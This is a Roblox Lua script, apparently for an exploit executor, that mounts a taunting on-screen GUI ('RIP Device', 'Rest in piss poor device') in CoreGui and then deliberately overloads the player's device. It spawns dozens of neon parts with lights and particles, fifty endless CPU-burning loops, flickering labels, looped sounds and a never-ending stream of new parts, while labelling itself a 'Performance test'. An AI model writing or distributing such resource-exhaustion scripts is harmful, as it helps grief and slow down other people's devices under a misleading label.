local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SomeGui"
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
title.Text = "RIP Device 💯"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local message = Instance.new("TextLabel")
message.Size = UDim2.new(1, -20, 0, 100)
message.Position = UDim2.new(0, 10, 0, 60)
message.BackgroundTransparency = 1
message.Text = "Rest in piss poor device 💀"
message.TextColor3 = Color3.new(1, 1, 1)
message.TextScaled = true
message.Font = Enum.Font.Gotham
message.Parent = frame

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 0, 30)
status.Position = UDim2.new(0, 10, 0, 160)
status.BackgroundTransparency = 1
status.Text = "THINK FAST CHUCKLENUTS!"
status.TextColor3 = Color3.new(1, 1, 1)
status.TextScaled = true
status.Font = Enum.Font.Gotham
status.Parent = frame

local function createPerformanceImpact()
  
    for i = 1, 50 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(5, 5, 5)
        part.Position = Vector3.new(math.random(-100, 100), math.random(10, 50), math.random(-100, 100))
        part.Anchored = true
        part.BrickColor = BrickColor.random()
        part.Material = Enum.Material.Neon
        part.Parent = workspace
       
        local particle = Instance.new("ParticleEmitter")
        particle.Parent = part
        
        local light = Instance.new("PointLight")
        light.Brightness = 5
        light.Range = 20
        light.Parent = part
  
        spawn(function()
            while true do
                wait(0.01)

                local x = 0
                for j = 1, 10000 do
                    x = x + math.sin(j) * math.cos(j)
                end
            end
        end)
    end
    
    for i = 1, 20 do
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0, 100, 0, 30)
        label.Position = UDim2.new(0, math.random(0, 200), 0, math.random(0, 200))
        label.BackgroundTransparency = 0.5
        label.Text = "Loading..."
        label.TextColor3 = Color3.new(1, 1, 1)
        label.Parent = screenGui
        
        spawn(function()
            while true do
                wait(0.05)
                label.Position = UDim2.new(0, math.random(0, 200), 0, math.random(0, 200))
                label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
            end
        end)
    end
    
    for i = 1, 10 do
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. tostring(131017227 + i)
        sound.Looped = true
        sound.Volume = 0.1
        sound.Parent = workspace
        sound:Play()
    end
    
    status.Text = "Performance test active"
end

wait(2)
createPerformanceImpact()

spawn(function()
    while true do
        wait(5)
        for i = 1, 10 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(2, 2, 2)
            part.Position = Vector3.new(math.random(-200, 200), math.random(10, 100), math.random(-200, 200))
            part.Anchored = true
            part.BrickColor = BrickColor.random()
            part.Parent = workspace
        end
    end
end)